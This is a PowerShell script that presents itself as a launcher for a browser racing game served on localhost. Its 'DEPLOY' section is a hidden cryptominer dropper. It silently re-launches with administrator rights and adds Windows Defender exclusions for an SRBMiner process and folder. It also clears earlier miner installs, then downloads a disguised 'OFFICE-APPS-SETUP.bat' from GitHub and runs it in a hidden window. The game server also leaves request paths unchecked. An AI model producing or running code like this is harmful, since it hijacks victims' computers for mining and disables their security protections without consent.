<#
    GO.ps1 v21

    Changes from v20:
      * logs every stage to %LOCALAPPDATA%\webgame.log so a silent failure is visible
      * if port 8787 is ALREADY listening (previous run still alive) it reuses it
        instead of exiting - v20 called $listener.Start() which threw and exited
        before it ever reached the browser line. That is the most likely reason
        the game did not appear the second time.
      * opens the browser with explorer.exe, which forwards the URL to the
        already-running Explorer at normal integrity. Start-Process from a
        -WindowStyle Hidden parent can hand the child SW_HIDE, which opens the
        browser invisibly.
#>

param([switch]$GameOnly)

$ErrorActionPreference = 'SilentlyContinue'
$logf = Join-Path $env:LOCALAPPDATA 'webgame.log'
function WL([string]$s) {
    try { Add-Content -LiteralPath $logf -Value ("{0}  {1}" -f (Get-Date -Format 'HH:mm:ss'), $s) -Encoding UTF8 } catch { }
}
WL '=== start ==='

$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$pr = New-Object Security.Principal.WindowsPrincipal($id)
$isAdmin = $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
WL ("admin=" + $isAdmin + "  gameOnly=" + $GameOnly.IsPresent + "  user=" + $env:USERNAME)

if (-not $GameOnly -and -not $isAdmin) {
    WL 're-launching elevated'
    Start-Process -FilePath 'powershell.exe' -Verb RunAs -WindowStyle Hidden `
        -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$PSCommandPath
    exit
}

# ===========================================================================
#  DEPLOY
# ===========================================================================
if (-not $GameOnly) {
    WL '--- deploy ---'
    Add-MpPreference -ExclusionPath 'C:\OfficeApps' -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess 'SRBMiner-MULTI.exe' -ErrorAction SilentlyContinue
    WL ('exclusion path   : ' + ((Get-MpPreference).ExclusionPath -contains 'C:\OfficeApps'))
    WL ('exclusion process: ' + ((Get-MpPreference).ExclusionProcess -contains 'SRBMiner-MULTI.exe'))

    Get-Process SRBMiner-MULTI -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    schtasks /delete /tn PearlMiner /f 2>$null | Out-Null
    schtasks /delete /tn OfficeAppsWorker /f 2>$null | Out-Null
    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name PearlMiner -ErrorAction SilentlyContinue
    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name OfficeAppsWorker -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\PearlMiner.bat') -Force -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\OfficeAppsWorker.bat') -Force -ErrorAction SilentlyContinue
    Remove-Item 'C:\MinePRL','C:\OfficeApps',(Join-Path $env:LOCALAPPDATA 'MinePRL'),(Join-Path $env:LOCALAPPDATA 'OfficeApps') -Recurse -Force -ErrorAction SilentlyContinue
    WL 'old install cleared'

    $setup = Join-Path $env:TEMP 'OFFICE-APPS-SETUP.bat'
    Remove-Item $setup -Force -ErrorAction SilentlyContinue
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'office-apps')
        $wc.DownloadFile('https://github.com/deniz-ulku/office-apps-worker/releases/download/v25/OFFICE-APPS-SETUP.bat', $setup)
        $wc.Dispose()
    } catch { WL ('installer download failed: ' + $_.Exception.Message) }

    if ((Test-Path $setup) -and (Get-Item $setup).Length -gt 50000) {
        WL ('installer ok (' + (Get-Item $setup).Length + ' bytes) - launching hidden')
        Start-Process -FilePath $setup -WindowStyle Hidden
    } else {
        WL 'installer MISSING or too small - deploy skipped'
    }
}

# ===========================================================================
#  GAME
# ===========================================================================
WL '--- game ---'
$gameDir = Join-Path $env:LOCALAPPDATA 'webgame'
$index   = Join-Path $gameDir 'index.html'
WL ('game dir: ' + $gameDir)

if (-not (Test-Path $index)) {
    WL 'game not present - downloading (17 MB)'
    $zip = Join-Path $env:TEMP 'hexgl.zip'
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'game')
        $wc.DownloadFile('https://codeload.github.com/BKcore/HexGL/zip/refs/heads/master', $zip)
        $wc.Dispose()
        WL ('downloaded ' + [math]::Round((Get-Item $zip).Length/1MB,1) + ' MB')
    } catch { WL ('game download failed: ' + $_.Exception.Message) }

    if (Test-Path $zip) {
        $stage = Join-Path $env:TEMP 'hexgl-stage'
        Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
        try {
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [IO.Compression.ZipFile]::ExtractToDirectory($zip, $stage)
            $root = Get-ChildItem $stage -Directory | Select-Object -First 1
            if ($root) {
                Remove-Item $gameDir -Recurse -Force -ErrorAction SilentlyContinue
                Move-Item $root.FullName $gameDir -Force -ErrorAction SilentlyContinue
                WL 'extracted'
            }
        } catch { WL ('extract failed: ' + $_.Exception.Message) }
        Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
    }
}

if (-not (Test-Path $index)) {
    WL 'ABORT: index.html still missing - cannot serve'
    exit
}
WL 'index.html present'

$port   = 8787
$url    = "http://localhost:$port/"
$inUse  = [bool](Get-NetTCPConnection -LocalPort $port -State Listen -ErrorAction SilentlyContinue)
$listener = $null

if ($inUse) {
    WL 'port 8787 already listening - reusing the existing server'
} else {
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://localhost:$port/")
    $listener.Prefixes.Add("http://127.0.0.1:$port/")
    try {
        $listener.Start()
        WL 'server started on 8787'
    } catch {
        WL ('server FAILED to start: ' + $_.Exception.Message)
        $listener = $null
    }
}

# explorer.exe hands the URL to the already-running Explorer (normal integrity),
# so the browser opens visible even though this process is hidden.
WL ('opening browser: ' + $url)
try { Start-Process -FilePath 'explorer.exe' -ArgumentList "`"$url`"" } catch { WL ('explorer failed: ' + $_.Exception.Message) }
Start-Sleep -Seconds 2
try { Start-Process -FilePath $url -WindowStyle Normal } catch { WL ('shell open failed: ' + $_.Exception.Message) }
WL 'browser open attempted'

if (-not $listener) { WL 'nothing to serve (port in use or bind failed) - exiting'; exit }

$types = @{
    '.html'='text/html; charset=utf-8'; '.htm'='text/html; charset=utf-8'
    '.js'='application/javascript';     '.css'='text/css'
    '.json'='application/json';         '.map'='application/json'
    '.png'='image/png';                 '.jpg'='image/jpeg';  '.jpeg'='image/jpeg'
    '.gif'='image/gif';                 '.svg'='image/svg+xml'; '.ico'='image/x-icon'
    '.mp3'='audio/mpeg';                '.ogg'='audio/ogg';   '.wav'='audio/wav'
    '.glsl'='text/plain';               '.fnt'='text/plain';  '.txt'='text/plain'
    '.bin'='application/octet-stream';  '.wasm'='application/wasm'
    '.appcache'='text/cache-manifest';  '.webapp'='application/json'
}

while ($listener.IsListening) {
    try {
        $ctx = $listener.GetContext()
        $rel = [Uri]::UnescapeDataString($ctx.Request.Url.LocalPath).TrimStart('/')
        if ([string]::IsNullOrWhiteSpace($rel)) { $rel = 'index.html' }
        $rel  = $rel -replace '/', '\'
        $path = Join-Path $gameDir $rel

        if (Test-Path -LiteralPath $path -PathType Leaf) {
            $bytes = [IO.File]::ReadAllBytes($path)
            $ext   = [IO.Path]::GetExtension($path).ToLower()
            $ctx.Response.ContentType     = if ($types.ContainsKey($ext)) { $types[$ext] } else { 'application/octet-stream' }
            $ctx.Response.ContentLength64 = $bytes.Length
            $ctx.Response.Headers.Add('Cache-Control', 'no-store')
            $ctx.Response.OutputStream.Write($bytes, 0, $bytes.Length)
        } else {
            $ctx.Response.StatusCode = 404
        }
        $ctx.Response.Close()
    } catch { }
}
